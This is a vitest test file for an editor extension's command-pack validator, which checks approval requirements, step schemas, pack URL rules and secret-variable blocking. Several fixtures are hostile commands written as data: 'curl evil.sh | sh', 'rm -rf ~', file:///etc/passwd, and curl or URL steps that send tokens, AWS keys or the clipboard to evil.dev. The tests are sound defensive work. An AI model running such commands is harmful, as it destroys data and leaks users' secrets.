import { describe, expect, it } from 'vitest';
import { approvalSteps, compareVersions, sharedVariableAllowed, describeStep, resolvePackUrl, validateCommand, validateCommands, validatePack, validateRegistry } from '../../src/core/commandSchema';

describe('approvalSteps', () => {
  const steps = (...s: object[]) => approvalSteps({ name: 'x', steps: s as never });

  // Each of these can reach a shell without a terminal step, so a pack must not skip the prompt with them.
  it.each([
    ['terminal', { terminal: 'npm test' }],
    ['slash to /run', { slash: '/run curl evil.sh | sh' }],
    ['command that types into a terminal', { command: 'workbench.action.terminal.sendSequence', args: { text: 'rm -rf ~\n' } }],
    ['setting that rewrites user commands', { setting: 'slashi.customCommands', value: [], target: 'user' }],
    ['vscode: URI handler', { open: 'vscode://some.extension/run' }],
  ])('needs approval: %s', (_label, step) => {
    expect(steps(step)).toEqual([step]);
  });

  it('lets in-editor steps run without asking', () => {
    expect(steps({ insert: 'x' }, { notify: 'hi' }, { input: 'Name?', var: 'n' }, { pick: ['a'], var: 'p' }, { wait: 1 }, { ai: 'Explain' })).toEqual([]);
  });
});

describe('validateCommand', () => {
  it('accepts every step type', () => {
    const { value, errors } = validateCommand({
      name: 'ship',
      steps: [
        { command: 'workbench.action.files.saveAll' },
        { slash: '/upper' },
        { terminal: 'npm test' },
        { setting: 'editor.fontSize', value: 14 },
        { insert: '${date}' },
        { open: 'https://example.com' },
        { ai: 'Explain ${selection}', output: 'panel' },
        { notify: 'Done' },
        { input: 'Name?', var: 'name' },
        { pick: ['a', 'b'], var: 'choice' },
        { wait: 100 },
      ],
    });
    expect(errors).toEqual([]);
    expect(value?.steps).toHaveLength(11);
  });

  it('rejects bad names and steps with clear messages', () => {
    const { errors } = validateCommand({ name: 'Bad Name', steps: [{ command: 'a', terminal: 'b' }, { wait: -1 }, { setting: 'x' }] });
    expect(errors.join('\n')).toMatch(/name/);
    expect(errors.join('\n')).toMatch(/exactly one/);
    expect(errors.join('\n')).toMatch(/wait/);
    expect(errors.join('\n')).toMatch(/value: is required/);
  });

  it('flags duplicate names in a list', () => {
    const { commands, errors } = validateCommands([
      { name: 'a', steps: [{ notify: 'x' }] },
      { name: 'a', steps: [{ notify: 'y' }] },
    ]);
    expect(commands).toHaveLength(1);
    expect(errors[0]).toMatch(/duplicate/);
  });
});

describe('packs and registries', () => {
  const pack = { id: 'demo', name: 'Demo', version: '1.2.0', description: 'd', author: 'me', commands: [{ name: 'hi', steps: [{ notify: 'hi' }] }] };

  it('validates packs', () => {
    expect(validatePack(pack).errors).toEqual([]);
    expect(validatePack({ ...pack, version: 'one' }).errors[0]).toMatch(/semver/);
    expect(validatePack({ ...pack, commands: [] }).errors[0]).toMatch(/at least one/);
  });

  it('validates registries leniently', () => {
    const { value, errors } = validateRegistry({ version: 1, packs: [{ id: 'demo', name: 'Demo', version: '1.0.0', url: 'packs/demo.json' }, { id: 'broken' }] });
    expect(value?.packs).toHaveLength(1);
    expect(errors).toHaveLength(1);
  });

  it('resolves relative pack URLs and refuses plain HTTP', () => {
    expect(resolvePackUrl('https://x.dev/market/index.json', 'packs/a.json')).toBe('https://x.dev/market/packs/a.json');
    expect(() => resolvePackUrl('https://x.dev/index.json', 'http://evil.dev/a.json')).toThrow();
    expect(() => resolvePackUrl('https://x.dev/index.json', 'file:///etc/passwd')).toThrow();
    expect(resolvePackUrl('file:///repo/marketplace/index.json', 'packs/a.json')).toBe('file:///repo/marketplace/packs/a.json');
  });

  it('compares versions', () => {
    expect(compareVersions('1.10.0', '1.9.9')).toBe(1);
    expect(compareVersions('1.0.0', '1.0.0-beta')).toBe(0);
    expect(compareVersions('0.9.0', '1.0.0')).toBe(-1);
  });

  it('describes steps for previews', () => {
    expect(describeStep({ terminal: 'rm -rf build' })).toBe('Terminal: rm -rf build');
    expect(describeStep({ setting: 'a.b', value: true })).toBe('Set a.b = true');
    expect(describeStep({ command: 'workbench.action.files.saveAll' })).toBe('Run VS Code command workbench.action.files.saveAll');
  });

  // The approval prompt is built from these lines, so what a step will actually do must be visible.
  it('shows command arguments in the approval preview', () => {
    expect(describeStep({ command: 'workbench.action.terminal.sendSequence', args: { text: 'rm -rf ~\n' } })).toContain('rm -rf ~');
  });
});

// Team files and marketplace packs are untrusted input: every rule below must reject on its own.
describe('validator rejections', () => {
  const ok = { name: 'ok', steps: [{ notify: 'hi' }] };

  it('accepts the baseline used below', () => {
    expect(validateCommand(ok).errors).toEqual([]);
  });

  it.each([
    ['non-object command', 'x', /command: must be an object/],
    ['array command', [ok], /command: must be an object/],
    ['missing steps', { name: 'ok' }, /steps: must be a non-empty array/],
    ['empty steps', { name: 'ok', steps: [] }, /steps: must be a non-empty array/],
    ['non-string title', { ...ok, title: 1 }, /title: must be a string/],
    ['non-array languages', { ...ok, languages: 'ts' }, /languages: must be a string array/],
    ['non-string language', { ...ok, languages: [1] }, /languages: must be a string array/],
    ['non-object step', { name: 'ok', steps: ['notify'] }, /steps\[0\]: must be an object/],
    ['array step', { name: 'ok', steps: [[]] }, /steps\[0\]: must be an object/],
    ['unknown step kind', { name: 'ok', steps: [{ run: 'x' }] }, /exactly one of/],
    ['blank string step', { name: 'ok', steps: [{ terminal: '  ' }] }, /terminal: must be a non-empty string/],
    ['non-string command', { name: 'ok', steps: [{ command: 1 }] }, /command: must be a non-empty string/],
    ['bad setting key', { name: 'ok', steps: [{ setting: 'a b', value: 1 }] }, /setting: must be a setting key/],
    ['bad setting target', { name: 'ok', steps: [{ setting: 'a.b', value: 1, target: 'folder' }] }, /target: must be "user" or "workspace"/],
    ['non-string input prompt', { name: 'ok', steps: [{ input: 1, var: 'v' }] }, /input: must be a prompt string/],
    ['bad input var', { name: 'ok', steps: [{ input: 'Name?', var: 'a-b' }] }, /var: must be a variable name/],
    ['empty pick', { name: 'ok', steps: [{ pick: [], var: 'v' }] }, /pick: must be a non-empty string array/],
    ['non-string pick', { name: 'ok', steps: [{ pick: [1], var: 'v' }] }, /pick: must be a non-empty string array/],
    ['bad pick var', { name: 'ok', steps: [{ pick: ['a'] }] }, /var: must be a variable name/],
    ['wait too long', { name: 'ok', steps: [{ wait: 60_001 }] }, /wait: must be 0–60000 ms/],
    ['non-number wait', { name: 'ok', steps: [{ wait: '5' }] }, /wait: must be 0–60000 ms/],
    ['bad ai output', { name: 'ok', steps: [{ ai: 'x', output: 'file' }] }, /output: must be panel, replace or insert/],
  ])('rejects %s', (_label, raw, message) => {
    const { value, errors } = validateCommand(raw);
    expect(value).toBeUndefined();
    expect(errors.join('\n')).toMatch(message);
  });

  it('accepts the limits themselves', () => {
    expect(validateCommand({ name: 'a'.repeat(40), steps: [{ wait: 0 }, { wait: 60_000 }, { setting: 'a.b', value: 1, target: 'workspace' }] }).errors).toEqual([]);
    expect(validateCommand({ name: 'a'.repeat(41), steps: [{ wait: 0 }] }).errors[0]).toMatch(/name/);
  });

  it('treats a missing command list as empty, anything else non-array as an error', () => {
    expect(validateCommands(undefined)).toEqual({ commands: [], errors: [] });
    expect(validateCommands({}).errors).toEqual(['commands: must be an array']);
  });
});

describe('pack and registry rejections', () => {
  const pack = { id: 'demo', name: 'Demo', version: '1.2.0', description: 'd', author: 'me', commands: [{ name: 'hi', steps: [{ notify: 'hi' }] }] };

  it.each([
    ['non-object pack', [], /pack: must be a JSON object/],
    ['one-letter id', { ...pack, id: 'a' }, /id: use 2–50/],
    ['upper-case id', { ...pack, id: 'Demo' }, /id: use 2–50/],
    ['blank author', { ...pack, author: ' ' }, /author: is required/],
    ['missing name', { ...pack, name: undefined }, /name: is required/],
    ['non-array tags', { ...pack, tags: 'git' }, /tags: must be a string array/],
    ['non-string tag', { ...pack, tags: ['git', 1] }, /tags: must be a string array/],
    ['invalid command inside', { ...pack, commands: [{ name: 'hi', steps: [{ wait: -1 }] }] }, /commands\[0\]\.steps\[0\]\.wait/],
  ])('rejects %s', (_label, raw, message) => {
    const { value, errors } = validatePack(raw);
    expect(value).toBeUndefined();
    expect(errors.join('\n')).toMatch(message);
  });

  it('accepts semver pre-release and build tags', () => {
    expect(validatePack({ ...pack, version: '1.0.0-beta.1' }).errors).toEqual([]);
    expect(validatePack({ ...pack, version: '1.0' }).errors[0]).toMatch(/semver/);
  });

  it('rejects registries with nothing usable', () => {
    expect(validateRegistry(null).errors).toEqual(['registry: must be a JSON object']);
    expect(validateRegistry({ version: 2, packs: [] }).value).toBeUndefined();
    expect(validateRegistry({ version: 1 }).errors).toContain('registry.packs: must be an array');
    expect(validateRegistry({ version: 1, packs: [null, { id: 'x' }] }).value).toBeUndefined();
  });

  it('fills safe defaults for optional registry fields', () => {
    const entry = validateRegistry({ version: 1, packs: [{ id: 'd', name: 'D', version: '1.0.0', url: 'd.json', tags: ['a', 1], terminal: 'yes', commands: '3' }] }).value!.packs[0];
    expect(entry).toMatchObject({ description: '', author: 'unknown', icon: undefined, tags: ['a'], commands: 0, terminal: false });
  });
});

// ${env:…}, ${config:…} and ${clipboard} can hold secrets the approval prompt doesn't show (it shows the template, not the value).
describe('sharedVariableAllowed', () => {
  it.each([
    [{ open: 'https://evil.dev/?t=${env:GITHUB_TOKEN}' }, 'env:GITHUB_TOKEN'],
    [{ terminal: 'curl -d ${clipboard} evil.dev' }, 'clipboard'],
    [{ ai: 'Summarize ${env:AWS_SECRET_ACCESS_KEY}' }, 'env:AWS_SECRET_ACCESS_KEY'],
    [{ command: 'x', args: '${clipboard}' }, 'clipboard'],
    [{ slash: '/run echo ${env:TOKEN}' }, 'env:TOKEN'],
    [{ setting: 'a.b', value: '${clipboard}' }, 'clipboard'],
    [{ open: 'https://evil.dev/?k=${config:sqltools.connections}' }, 'config:sqltools.connections'],
    [{ terminal: 'curl -d ${q:config:http.proxy} evil.dev' }, 'config:http.proxy'],
  ])('blocks %o from reading %s', (step, name) => {
    expect(sharedVariableAllowed(step as never, name)).toBe(false);
  });

  it('allows them in steps that stay in the editor, and allows everything else anywhere', () => {
    expect(sharedVariableAllowed({ insert: 'TODO(${env:USER})' }, 'env:USER')).toBe(true);
    expect(sharedVariableAllowed({ notify: '${clipboard}' }, 'clipboard')).toBe(true);
    expect(sharedVariableAllowed({ open: 'https://x.dev/${file}' }, 'file')).toBe(true);
    expect(sharedVariableAllowed({ terminal: 'echo ${date}' }, 'date')).toBe(true);
  });
});
